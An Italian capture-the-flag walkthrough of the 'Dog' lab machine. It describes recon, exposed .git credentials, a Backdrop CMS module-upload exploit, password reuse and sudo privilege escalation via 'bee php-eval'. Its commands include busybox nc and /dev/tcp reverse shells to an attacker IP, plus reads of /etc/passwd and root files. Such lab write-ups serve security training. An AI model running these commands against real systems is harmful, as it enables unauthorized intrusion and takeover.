# 🐶 Dog CTF - Walkthrough

## 🔍 Ricognizione

Ho iniziato con una scansione **Nmap** per individuare le porte aperte e i servizi attivi sulla macchina target.

```bash
nmap -sC -sV -A 10.10.11.58
```

I risultati hanno mostrato due porte aperte:

- **Porta 22** → SSH
- **Porta 80** → HTTP

Durante la scansione, ho notato la presenza di una cartella `.git`, il che suggerisce che il sito web potrebbe avere un repository Git accessibile.

## 📂 Recupero del Repository Git

Utilizzando `git-dump`, ho scaricato il contenuto del repository presente nella cartella `.git`.

All'interno del repository, ho individuato un file `settings.php`, che contiene una **password**.

## 🔎 Identificazione di un Utente

Dopo aver trovato la password, ho cercato un possibile username. Esplorando il sito sulla porta 80, ho individuato un nome utente, ma non era associato alla password trovata.

Ho notato che le email degli utenti seguivano il formato `@dog.htb`, quindi ho eseguito una ricerca mirata all'interno del repository Git:

```bash
grep "@dog.htb" -r .
```

Questa ricerca ha rivelato l'utente **tiffany**. Ho provato ad accedere con la password trovata in `settings.php` e sono riuscito a entrare nel sistema.

## 🔥 Exploit per Backdrop CMS

Dopo ulteriori analisi, ho scoperto che il sito web utilizzava **Backdrop CMS**, e ho trovato un exploit disponibile su **Exploit-DB**:

🔗 [Backdrop CMS Exploit](https://www.exploit-db.com/exploits/52021)

Questo exploit consente di creare un modulo personalizzato che permette l'esecuzione di codice arbitrario.

Per creare il modulo ho utilizzato due file:

- `shell.info`
- `shell.php`

Questi file sono stati compressi in un archivio `.tar.gz` e caricati nel CMS.

Dopo l'installazione del modulo, ho navigato nella sezione **modules** ed eseguito `shell.php`, ottenendo l'esecuzione di comandi bash sul server.

## 🐚 Ottenere una Shell

Per stabilire una **reverse shell**, ho avviato un listener sulla mia macchina:

```bash
nc -lvnp 4444
```

E poi, dal server target, ho eseguito:

```bash
busybox nc 10.10.16.102 4444 -e sh
```

Una volta dentro la macchina, ho migliorato l'interattività della shell con:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ho quindi cercato gli utenti presenti nel sistema:

```bash
cat /etc/passwd
```

Ho individuato due utenti con una shell attiva, tra cui **johncusack**. Ho provato ad accedere tramite **SSH**:

```bash
ssh johncusack@10.10.11.58
```

Usando la password trovata in `settings.php`, sono riuscito ad accedere all'utente **johncusack** e recuperare la **flag user.txt**.

## 🚀 Privilege Escalation

Per verificare i permessi di **sudo**, ho eseguito:

```bash
sudo -l
```

Ho scoperto che l'utente **john** poteva eseguire il comando `bee`, che permette di eseguire **PHP** con privilegi elevati.

Dopo alcune ricerche, ho scoperto che `bee` necessitava del percorso di **Backdrop CMS**, che si trovava in `/var/www/html`.

A questo punto, ho eseguito dall'interno del percorso precedentemente trovato:

```bash
sudo bee php-eval 'echo(exec("cat /root/root.txt"))'
```

E ho ottenuto la **flag root.txt**! 🏆

### 🔄 Alternativa: Reverse Shell con Privilegi di Root

Un'alternativa per ottenere una shell con privilegi di root sarebbe stata eseguire:

```bash
sudo bee php-eval 'system("bash -c 'bash -i >& /dev/tcp/10.10.16.102/4444 0>&1'")'
```

## 🎯 Conclusione

Questa macchina è stata un'ottima sfida che ha richiesto un mix di tecniche di **enumerazione**, **exploit di Backdrop CMS**, **reverse shell**, e **privilege escalation** con `bee`. 🚀
